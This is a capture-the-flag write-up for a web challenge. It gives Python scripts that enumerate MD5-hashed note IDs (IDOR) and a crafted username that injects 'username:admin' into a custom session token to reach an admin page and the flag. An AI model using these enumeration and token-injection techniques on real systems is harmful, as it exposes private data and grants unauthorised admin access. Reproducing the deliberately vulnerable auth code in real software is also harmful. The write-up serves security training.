# [EASY] WEB - NoteVault

## Overview
This web application contains two vulnerabilities:
	- Insecure Direct Object Reference (IDOR) via the usage of MD5 hashes for 'secure' note IDs.
	- Session injection via a crafted username and poorly implemented custom authentication.

## Initial Analysis
- Visit the web application, create an account, login and create a couple new notes.
- When viewing the notes, see that the note ID in the URI is just an MD5 hash.
- Cracking the hash will reveal that is is just an integer that increments by 1 for every new note.

## Exploitation
First, run a directory fuzzing script to find interesting directories

```
===============================================================
admin/dashboard      (Status: 403) [Size: 1005]
dashboard            (Status: 302) [Size: 189] [--> /]
...
```

Write a quick fuzzing script or use a directory fuzzer with a custom wordlist containing MD5 hashes of incrementing integers to discover valid note IDs.

```
from requests import get
from hashlib import md5

HOST = "http://CHALLENGE_IP:CHALLENGE_PORT/note/"
COOKIES = {"session": "INSERT-YOUR-SESSION-TOKEN-HERE"}

def make_request(note_id):
    resp = get(f"{HOST}{note_id}", cookies=COOKIES).text
    if "Note Does Not Exist" not in resp:
        return True

    return False

def main():
    for num in range(0, 100):
        note_id = md5(str(num).encode()).hexdigest()
        if make_request(note_id):
            print(f"Valid Note ID: {num}\t->\t{note_id}")

if __name__ == '__main__':
    main()
```

```
Valid Note ID: 1	->	c4ca4238a0b923820dcc509a6f75849b
Valid Note ID: 2	->	c81e728d9d4c2f636f067f89cc14862c
Valid Note ID: 3	->	eccbc87e4b5ce2fe28308fd9f2a7baf3
Valid Note ID: 4	->	a87ff679a2f3e71d9181a67b7542122c
Valid Note ID: 5	->	e4da3b7fbbce2345d7772b0674a318d5
...
Valid Note ID: 57	->	72b32a1f754ba1c09b3695e0cb6cde7f
Valid Note ID: 58	->	66f041e16a60928b05a7e228a89c3799
Valid Note ID: 59	->	093f65e080a295f8076b1c5722a46aa2
```

Search through some of the notes and find that some of the notes have been written by a user named **developer**.

Alter the script to find only the notes written by **developer**.

```
from requests import get
from hashlib import md5

HOST = "http://CHALLENGE_IP:CHALLENGE_PORT/note/"
COOKIES = {"session": "INSERT-YOUR-SESSION-TOKEN-HERE"}

def make_request(note_id):
    resp = get(f"{HOST}{note_id}", cookies=COOKIES).text
    if "Note Does Not Exist" not in resp and "developer" in resp:
        return True

    return False

def main():
    for num in range(0, 100):
        note_id = md5(str(num).encode()).hexdigest()
        if make_request(note_id):
            print(f"Valid Note ID: {num}\t->\t{note_id}")

if __name__ == '__main__':
    main()
```

```
Valid Note ID: 7	->	8f14e45fceea167a5a36dedd4bea2543
Valid Note ID: 20	->	98f13708210194c475687be6106a3b84
Valid Note ID: 21	->	3c59dc048e8850243be8079a5c74d079
Valid Note ID: 27	->	02e74f10e0327ad868d138f2b4fdd6f0
Valid Note ID: 31	->	c16a5320fa475530d9583c34fd356ef5
Valid Note ID: 34	->	e369853df766fa44e1ed0ff613f563bd
Valid Note ID: 36	->	19ca14e7ea6328a42e0eb13d585e4c22
Valid Note ID: 41	->	3416a75f4cea9109507cacd8e2f2aefc
Valid Note ID: 46	->	d9d4f495e875a2e075a1a4a6e1b9770f
```

Search through the notes written by **developer** and find the note about the new auth functions.

`http://CHALLENGE-IP:CHALLENGE-PORT/note/3416a75f4cea9109507cacd8e2f2aefc`
```
Implement new auth functions:

def build_token(username):
    token = f"username:{username};timestamp:{str(int(time()))}"
    return token

def parse_token(token):
    try:
        token_data = [token_chunk.split(":") for token_chunk in token.split(";")]
        return dict(token_data)
    
    except Exception:
        return None
```

When logging in, the `build_token()` is called which directly concatenates the provided username into the session token with no input sanitisation.

When visiting an auth restricted page, the `parse_token()` function is called which splits the token string into its "username" and "timestamp" chunks before converting them into a dictionary to be indexed later on.

```
>>> token = "username:test;timestamp:1780244478"
>>> token_data = [token_chunk.split(":") for token_chunk in token.split(";")]
>>> print(dict(token_data))
{'username': 'test', 'timestamp': '1780244478'}
```

Due to the fact that dictionary keys need to be unique, it is possible to inject a fake **username:admin** section into the session token when creating an account.
When the token is parsed, the **username** value will be overwritten with **admin** allowing access to the admin dashboard.

```
>>> token = "username:test;username:admin;timestamp:1780244478"
>>> token_data = [token_chunk.split(":") for token_chunk in token.split(";")]
>>> print(dict(token_data))
{'username': 'admin', 'timestamp': '1780244478'}
```

Logout and register a new account with the username: `test;username:admin`

Log back in with the new crafted username and visit `/admin/dashboard` to get the flag.

```
$ curl -s http://CHALLENGE-IP:CHALLENGE-PORT/admin/dashboard -b 'session=INSERT-YOUR-SESSION-TOKEN-HERE' | tail

<h1 style="margin-bottom: 0.5rem;">Admin Dashboard</h1>
<h2 style="color: #7f8c8d;">Here is your gift Mr Admin:</h2>
<h3>P2P{D0nT_Impl3m3nT_Cu5t0m_4utH_1t_5uck5}</h3>
```
